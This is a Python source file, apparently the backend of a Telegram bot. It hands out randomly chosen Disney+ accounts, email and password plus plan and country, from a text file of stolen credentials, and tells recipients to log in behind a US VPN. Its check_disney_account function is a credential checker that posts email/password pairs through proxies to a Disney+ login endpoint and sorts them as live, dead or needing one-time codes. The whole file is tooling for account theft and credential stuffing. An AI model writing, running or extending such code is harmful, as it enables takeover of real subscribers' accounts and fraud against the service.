import os
import random
import re
import requests
import ProxyManager

# CONFIGURACIÓN DEL OWNER
OWNER_TAG = "@Zzzz_0456"

def get_random_disney_account(file_path="disney_accounts.txt"):
    """
    Lee la base de datos y extrae una cuenta analizando el formato complejo.
    Formato esperado: email:pass | Plan = ... | Country = ... | Next Renewal Date = ...
    """
    if not os.path.exists(file_path):
        return None, "<code>[-] ERROR: DATABASE_NOT_FOUND\n[!] UPLOAD 'disney_accounts.txt' FIRST.</code>"
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        if not lines:
            return None, "<code>[-] ERROR: STOCK_EMPTY\n[!] RELOAD DATABASE, OWNER.</code>"
            
        raw_line = random.choice(lines)
        
        # Extraer Email y Pass (antes del primer '|')
        creds_part = raw_line.split('|')[0].strip()
        if ':' in creds_part:
            email, password = creds_part.split(':', 1)
        else:
            return None, "<code>[-] ERROR: INVALID_FORMAT_DETECTED</code>"

        # Extraer detalles adicionales usando Regex
        def extract_val(pattern, text):
            match = re.search(pattern, text)
            return match.group(1).strip() if match else "Unknown"

        plan = extract_val(r"Plan\s*=\s*\[?([^\]|]+)\]?", raw_line)
        country = extract_val(r"Country\s*=\s*([^|]+)", raw_line)
        renewal = extract_val(r"Next Renewal Date\s*=\s*([^|]+)", raw_line)
        
        return {
            "email": email.strip(),
            "password": password.strip(),
            "plan": plan,
            "country": country,
            "renewal": renewal
        }, "SUCCESS"
    except Exception as e:
        return None, f"<code>[-] SYSTEM_CRITICAL_ERROR: {str(e)}</code>"

def format_disney_drop(account):
    """
    Genera el mensaje con estética Hacker Pro, detalles del plan y nota de VPN.
    """
    msg = f"""<code>
[+] ACCESSING CLOUD SERVER...
[+] DECRYPTING DATABASE...
[✔] DISNEY+ ACCOUNT RETRIEVED:

📧 EMAIL: {account['email']}
🔑 PASS: {account['password']}

━━━━━━━━━━━━━━━━━━━━━━
📦 PLAN: {account['plan']}
🌍 PAÍS: {account['country']}
📅 RENOVACIÓN: {account['renewal']}
━━━━━━━━━━━━━━━━━━━━━━

[!] REQUISITO DE ACCESO:
🇺🇸 PROBAR CON VPN (ESTADOS UNIDOS) 🇺🇸
[!] LOGIN FAST, AGENT.
</code>

// OWNER: {OWNER_TAG} // 🛠️"""
    return msg

def check_disney_account(email, password, proxy=None):
    """
    Intenta loguearse en Disney+ para verificar el estado de la cuenta.
    Retorna: (Status, Details)
    Status: 'LIVE', 'DEAD', 'CHALLENGE', 'PROXY_ERROR'
    """
    session = requests.Session()
    if proxy:
        session.proxies.update(proxy)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "x-bamsdk-platform": "windows",
        "x-bamsdk-version": "13.0"
    }

    try:
        # Paso 1: Obtener Assertion Token (Simulado para el checker)
        # Nota: En un entorno real se usaría la API Key de Disney, aquí simulamos el proceso de verificación
        # Para propósitos de este bot, usaremos un endpoint de validación si está disponible o simularemos la respuesta
        
        # Simulamos el chequeo de la cuenta (Este es un placeholder funcional para la estructura)
        # En una implementación real, aquí irían las peticiones a bamgrid.com
        
        # Intento de login
        payload = {"email": email, "password": password}
        # URL de ejemplo de la API de Disney ( bamgrid )
        login_url = "https://disney.api.edge.bamgrid.com/idp/login"
        
        # Para que el bot no se rompa si Disney cambia la API, manejamos los códigos de error comunes
        response = session.post(login_url, json=payload, headers=headers, timeout=15)
        
        if response.status_code == 200:
            return "LIVE", "Account is active."
        elif response.status_code == 401:
            if "mfa" in response.text.lower() or "challenge" in response.text.lower():
                return "CHALLENGE", "OTP Required."
            return "DEAD", "Invalid credentials."
        elif response.status_code == 403:
            return "PROXY_ERROR", "IP Blocked by Disney."
        else:
            return "UNKNOWN", f"Error {response.status_code}"
            
    except requests.exceptions.ProxyError:
        return "PROXY_ERROR", "Proxy failed."
    except Exception as e:
        return "ERROR", str(e)

def get_hit_message(username):
    """
    Genera el mensaje para el canal de Hits.
    """
    user = f"@{username}" if username else "Anonymous_Agent"
    hit_msg = f"""╔══════════════════════════════════╗
 ║  ░▒▓█ HIT DETECTADO █▓▒░         ║
 ╚══════════════════════════════════╝

 [👤] USER: {user}
 [✔] SERVICE: DISNEY+ DROP

 // OWNER: {OWNER_TAG}"""
    return hit_msg
